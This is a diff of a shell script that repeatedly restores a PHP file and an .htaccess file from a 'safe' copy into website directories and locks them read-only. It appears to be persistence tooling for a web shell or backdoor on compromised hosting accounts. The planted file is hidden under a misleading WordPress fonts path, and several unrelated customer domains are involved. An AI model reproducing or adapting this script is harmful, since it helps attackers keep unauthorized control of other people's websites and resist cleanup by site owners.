@@ -1,7 +1,7 @@
 #!/bin/sh
 
-FILE="/home/u200768895/domains/aceprofessionalpainting.ca/public_html/index.php"
-SAFE="/home/samsufyop/malam.545565.rest/spongebob/index.php"
+FILE="/home/u200768895/domains/ironbaylogistics.com/public_html/wp-content/updraft/widgets/fonts/style-engine/file.php"
+SAFE="/home/u200768895/domains/ssbelectrical.ca/public_html/wp-content/plugins/jeg-elementor-kit/file_backup.php"
 
 if [ ! -f "$FILE" ]; then
     cp "$SAFE" "$FILE"
@@ -14,8 +14,8 @@ if [ -f "$FILE" ] && ! cmp -s "$FILE" "$SAFE"; then
     chmod 444 "$FILE"
 fi
 
-HTFILE="/home/u200768895/domains/aceprofessionalpainting.ca/public_html/.htaccess"
-HTSAFE="/home/samsufyop/malam.545565.rest/spongebob/.htaccess"
+HTFILE="/home/u200768895/domains/ironbaylogistics.com/public_html/wp-content/updraft/widgets/fonts/style-engine/.htaccess"
+HTSAFE="/home/u200768895/domains/ssbelectrical.ca/public_html/wp-content/plugins/jeg-elementor-kit/.htaccess"
 
 if [ ! -f "$HTFILE" ]; then
     cp "$HTSAFE" "$HTFILE"
